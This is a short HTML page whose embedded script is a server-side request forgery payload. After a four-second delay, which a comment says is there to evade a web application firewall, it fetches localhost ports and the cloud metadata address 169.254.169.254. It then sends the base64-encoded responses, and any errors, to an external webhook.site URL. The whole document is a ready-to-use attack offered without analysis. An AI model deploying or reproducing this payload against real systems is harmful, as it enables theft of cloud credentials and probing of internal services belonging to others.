<!DOCTYPE html>
<html>
<body>
<script>
const hook = "https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525";

// Esperar 4 segundos antes de iniciar para evitar WAF
setTimeout(() => {
  const targets = [
    "http://127.0.0.1/",
    "http://127.0.0.1:3000/",
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost/",
    "http://localhost:8080/"
  ];

  targets.forEach(url => {
    fetch(url)
      .then(r => r.text())
      .then(txt => fetch(hook + "?ssrf_hit=" + encodeURIComponent(url) + "&data=" + btoa(txt.slice(0,150))))
      .catch(e => fetch(hook + "?ssrf_fail=" + encodeURIComponent(url) + "&err=" + encodeURIComponent(e.message)));
  });
}, 4000);
</script>
</body>
</html>
